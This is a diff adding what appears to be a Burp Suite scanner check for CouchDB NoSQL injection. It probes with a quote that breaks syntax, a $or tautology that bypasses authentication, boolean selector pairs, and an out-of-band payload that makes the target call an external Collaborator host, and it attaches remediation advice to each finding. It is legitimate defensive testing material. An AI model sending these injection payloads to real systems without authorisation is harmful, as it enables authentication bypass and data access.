@@ -1,0 +1,65 @@
+# CouchDB NoSQL Injection Detection
+# Tests syntax break, operator injection, boolean-based, and OOB NoSQLi
+
+given insertion_point: "json"  # For CouchDB _find or views
+
+# Extract baseline response
+extract original_body from response.body
+extract original_status from response.status
+extract original_time from response.time
+
+# 1. Syntax Break: Trigger CouchDB JSON error
+send request:
+  replace insertion_point with insertion_point + "'"
+if regex `CouchDB error|JSON parse error|invalid JSON` in response.body then
+  report issue:
+    severity: high
+    confidence: certain
+    name: "CouchDB NoSQL Injection (Syntax Break)"
+    detail: "CouchDB syntax error detected with payload: {insertion_point + '''}. Response: {regex `CouchDB error|JSON parse error|invalid JSON`}"
+    remediation: "Validate JSON inputs; use CouchDB's strict mode."
+end if
+
+# 2. Operator Injection: Bypass with $or (always true)
+send request:
+  replace insertion_point with `{"$or": [{"password": {"$eq": ""}}, {"password": {"$eq": ""}}]}`  # Tautology for bypass
+extract bypass_response from response.body
+
+if bypass_response != original_body and response.status == 200 then
+  report issue:
+    severity: high
+    confidence: firm
+    name: "CouchDB NoSQL Injection (Operator Bypass)"
+    detail: "Query bypassed with $or tautology. Response changed from original."
+    remediation: "Sanitize operators; use validated selectors."
+end if
+
+# 3. Boolean-Based: True/false via selector conditions
+send request:
+  replace insertion_point with `{"password": {"$eq": "test"}}`  # True match
+extract true_response from response.body
+
+send request:
+  replace insertion_point with `{"password": {"$eq": "invalid"}}`  # False match
+extract false_response from response.body
+
+if true_response != false_response and true_response == original_body then
+  report issue:
+    severity: high
+    confidence: firm
+    name: "CouchDB NoSQL Injection (Boolean-Based)"
+    detail: "Response differed between true/false selector conditions. True payload: {\"password\": {\"$eq\": \"test\"}}"
+    remediation: "Use Mango selectors with input escaping."
+end if
+
+# 4. Out-of-Band: HTTP callback via _update or design doc
+send request:
+  replace insertion_point with `{"_id": "test", "callback": "http://test." + collaborator_address + "/exploit"}`  # Triggers external call if vulnerable
+if http interactions then
+  report issue:
+    severity: high
+    confidence: certain
+    name: "CouchDB NoSQL Injection (Out-of-Band)"
+    detail: "HTTP interaction detected via Collaborator with callback payload."
+    remediation: "Restrict design docs; disable remote updates."
+end if
